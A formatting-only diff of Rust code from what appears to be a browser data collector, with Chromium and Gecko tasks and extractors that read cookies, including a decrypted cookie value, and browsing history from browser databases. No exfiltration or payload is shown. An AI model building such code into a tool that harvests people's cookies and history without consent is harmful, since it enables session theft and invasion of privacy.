@@ -33,10 +33,7 @@ pub struct BrowsersTask<C: Collector, F: FileSystem> {
 impl<C: Collector + 'static, F: FileSystem + 'static> Default for BrowsersTask<C, F> {
     fn default() -> Self {
         Self {
-            inner: composite_task!(
-                ChromiumTask::default(),
-                GeckoTask::default()
-            ),
+            inner: composite_task!(ChromiumTask::default(), GeckoTask::default()),
         }
     }
 }
@@ -140,12 +137,12 @@ pub(crate) trait ExtractExt<Args: Tuple + Clone>: Extract<Args> {
 impl<T, Args> ExtractExt<Args> for T
 where
     Args: Tuple + Clone,
-    T: Extract<Args>
+    T: Extract<Args>,
 {
     fn make_extractor<R>(args: Args) -> impl Fn(&R) -> Option<Self>
     where
         Self: Sized,
-        R: TableRecord
+        R: TableRecord,
     {
         move |record| Self::extract(record, args.clone())
     }
@@ -171,7 +168,7 @@ impl Display for Cookie {
 }
 
 /// # Parameters
-/// 
+///
 /// - `host_idx` (`usize`): The index of the host key field in the record.
 /// - `name_idx` (`usize`): The index of the cookie name field in the record.
 /// - `path_idx` (`usize`): The index of the cookie path field in the record.
@@ -183,15 +180,12 @@ impl Display for Cookie {
 /// used to extract or decrypt the cookie value.
 impl<F> Extract<(usize, usize, usize, usize, usize, F)> for Cookie
 where
-    F: Fn(Value) -> Option<Arc<str>>
+    F: Fn(Value) -> Option<Arc<str>>,
 {
-    fn extract<R>(
-        record: &R,
-        args: (usize, usize, usize, usize, usize, F)
-    ) -> Option<Self>
+    fn extract<R>(record: &R, args: (usize, usize, usize, usize, usize, F)) -> Option<Self>
     where
         Self: Sized,
-        R: TableRecord
+        R: TableRecord,
     {
         let (host_idx, name_idx, path_idx, expires_idx, value_idx, value_fn) = args;
 
@@ -315,7 +309,7 @@ pub(crate) struct History {
 }
 
 /// # Parameters
-/// 
+///
 /// - `url_offset` (`usize`): The index of the URL field in the record.
 /// - `title_offset` (`usize`): The index of the title field in the record.
 /// - `last_visit_time_offset` (`usize`):
@@ -324,7 +318,7 @@ impl Extract<(usize, usize, usize)> for History {
     fn extract<R>(record: &R, args: (usize, usize, usize)) -> Option<Self>
     where
         Self: Sized,
-        R: TableRecord
+        R: TableRecord,
     {
         let (url_offset, title_offset, last_visit_time_offset) = args;
 
